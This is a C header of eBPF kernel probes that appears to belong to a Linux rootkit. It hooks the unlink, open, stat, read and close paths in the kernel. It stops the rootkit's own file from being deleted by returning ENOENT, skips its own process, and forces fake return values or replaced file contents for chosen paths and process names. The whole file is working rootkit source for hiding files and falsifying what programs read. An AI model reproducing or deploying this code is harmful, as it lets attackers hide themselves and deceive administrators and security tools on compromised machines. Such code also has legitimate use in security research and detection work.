#ifndef __FS_H
#define __FS_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/dirent.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

#include "override_dir_kern.h"
#include "override_cnt_kern.h"

static __attribute__((always_inline)) u64 get_comm_hash()
{
    char comm[32];
    bpf_get_current_comm(&comm, sizeof(comm));

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, comm);

    return hash;
}

static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
{
    struct inode *d_inode;
    bpf_probe_read(&d_inode, sizeof(d_inode), &dentry->d_inode);

    struct super_block *sb;
    bpf_probe_read(&sb, sizeof(sb), &d_inode->i_sb);

    struct file_system_type *type;
    bpf_probe_read(&type, sizeof(type), &sb->s_type);

    char *name_ptr;
    bpf_probe_read(&name_ptr, sizeof(name_ptr), &type->name);

    char name[32];
    bpf_probe_read_str(&name, sizeof(name), name_ptr);

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, name);

    return hash;
}

static __attribute__((always_inline)) int path_attr_matches(struct rk_path_attr_t *path_attr, struct dentry *dentry) {    
    if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry)) {
        return 0;
    }

    if (path_attr->comm_hash && path_attr->comm_hash != get_comm_hash()) {
        return 0;
    }

    return 1;
}

static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struct dentry *dentry)
{
    struct qstr qstr;
    struct dentry *d_parent;
    struct inode *d_inode = NULL;
    char name[MAX_SEGMENT_LENGTH + 1];
    int end = 0;

    struct rk_path_key_t key = {
        .hash = FNV_BASIS,
    };

#pragma unroll
    for (int i = 0; i < 15; i++)
    {
        d_parent = NULL;
        bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);

        if (dentry != d_parent)
            bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);

        bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
        bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);

        if (name[0] == '/' || name[0] == 0)
        {
            name[0] = '/';
            end = 1;
        }

        key.hash = FNV_BASIS;
        update_hash_str(&key.hash, name);

        struct rk_path_attr_t *path_attr = bpf_map_lookup_elem(&rk_path_attrs, &key);
        if (!path_attr)
            key.pos = 0;
        else
        {
            if (path_attr->action.id && path_attr_matches(path_attr, dentry))
                return path_attr;
            key.pos++;
        }

        if (end)
            return 0;

        dentry = d_parent;
    }

    return 0;
}

static __attribute__((always_inline)) int access_path(struct path *path)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u64 pid;
    LOAD_CONSTANT("rk_pid", pid);

    if (pid == pid_tgid >> 32)
        return 0;

    struct dentry *dentry;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);

    struct rk_path_attr_t *path_attr = get_path_attr(dentry);
    if (!path_attr)
        return 0;

    struct rk_file_t file = {
        .action = path_attr->action,
    };
    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);

    return 0;
}

static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, const char *filename)
{
    u64 rk_hash;
    LOAD_CONSTANT("rk_hash", rk_hash);

    if (!rk_hash)
        return 0;

    const char basename[256];
    bpf_probe_read_str((void *)basename, sizeof(basename), (void *)filename);

    u64 hash = FNV_BASIS;

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (basename[i] == '\0')
        {
            if (hash == rk_hash)
                bpf_override_return(ctx, -ENOENT);
        }
        else if (basename[i] == '/')
            hash = FNV_BASIS;
        else
            update_hash_byte(&hash, basename[i]);
    }

    return 0;
}

SEC("kprobe/__x64_sys_unlink")
int __x64_sys_unlink(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    const char *filename = NULL;
    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM1(rctx));

    return handle_unlink(ctx, filename);
}

SEC("kprobe/__x64_sys_unlinkat")
int __x64_sys_unlinkat(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    const char *filename = NULL;
    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM2(rctx));

    return handle_unlink(ctx, filename);
}

SEC("kprobe/vfs_open")
int _vfs_open(struct pt_regs *ctx)
{
    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
    return access_path(path);
}

SEC("kprobe/vfs_getattr")
int _vfs_getattr(struct pt_regs *ctx)
{
    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
    return access_path(path);
}

static __attribute__((always_inline)) int path_accessed(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
        return 0;

    struct rk_fd_key_t fd_key =
        {
            .fd = (u64)PT_REGS_RC(ctx),
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t fd_attr = {
        .action = file->action,
    };
    bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);

    if (fd_attr.action.id & OVERRIDE_RETURN_ACTION)
    {
        bpf_override_return(ctx, fd_attr.action.return_value);
        return 0;
    }

    return 0;
}

SEC("kretprobe/__x64_sys_openat")
int __x64_sys_openat_ret(struct pt_regs *ctx)
{
    return path_accessed(ctx);
}

SEC("kretprobe/__x64_sys_stat")
int __x64_sys_stat_ret(struct pt_regs *ctx)
{
    return path_accessed(ctx);
}

SEC("kretprobe/__x64_sys_lstat")
int __x64_sys_lstat_ret(struct pt_regs *ctx)
{
    return path_accessed(ctx);
}

SEC("kretprobe/__x64_sys_newlstat")
int __x64_sys_newlstat_ret(struct pt_regs *ctx)
{
    return path_accessed(ctx);
}

SEC("kretprobe/__x64_sys_fstat")
int __x64_sys_fstat_ret(struct pt_regs *ctx)
{
    return path_accessed(ctx);
}

SEC("kprobe/__x64_sys_close")
int __x64_sys_close(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    bpf_map_delete_elem(&rk_files, &pid_tgid);
    bpf_map_delete_elem(&rk_getdents, &pid_tgid);

    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(rctx));

    struct rk_fd_key_t fd_key =
        {
            .fd = fd,
            .pid = pid_tgid >> 32,
        };

    bpf_map_delete_elem(&rk_fd_attrs, &fd_key);

    return 0;
}

SEC("kprobe/__x64_sys_read")
int kprobe_sys_read(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(rctx));

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_fd_key_t fd_key =
        {
            .fd = fd,
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & OVERRIDE_RETURN_ACTION)
    {
        bpf_override_return(ctx, fd_attr->action.return_value);
        return 0;
    }

    void *buf = NULL;
    bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(rctx));

    fd_attr->read_buf = buf;

    struct rk_file_t file = {
        .fd = fd,
        .action = fd_attr->action,
    };
    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);

    return 0;
}

SEC("kretprobe/vfs_read")
int _vfs_read(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
        return 0;

    struct rk_fd_key_t fd_key =
        {
            .fd = file->fd,
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & OVERRIDE_CONTENT_ACTION)
        bpf_tail_call(ctx, &rk_progs, OVERRIDE_CONTENT_PROG);
    else
        bpf_tail_call(ctx, &rk_progs, fd_attr->action.id);

    return 0;
}

SEC("kretprobe/__x64_sys_read")
int __x64_sys_read_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
        return 0;

    struct rk_fd_key_t fd_key =
        {
            .fd = file->fd,
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & OVERRIDE_CONTENT_ACTION)
    {
        if (fd_attr->action.id & APPEND_CONTENT_ACTION)
        {
            int ret = (int)PT_REGS_RC(ctx);
            if (!ret)
                override_content(ctx, fd_attr);
        }
        else
            override_content(ctx, fd_attr);
    }
    else if (fd_attr->action.id & OVERRIDE_RETURN_ACTION)
    {
        bpf_override_return(ctx, fd_attr->action.return_value);

        if (fd_attr->action.id & KMSG_ACTION)
            fd_attr->action.id &= ~OVERRIDE_RETURN_ACTION;
    }

    return 0;
}

#endif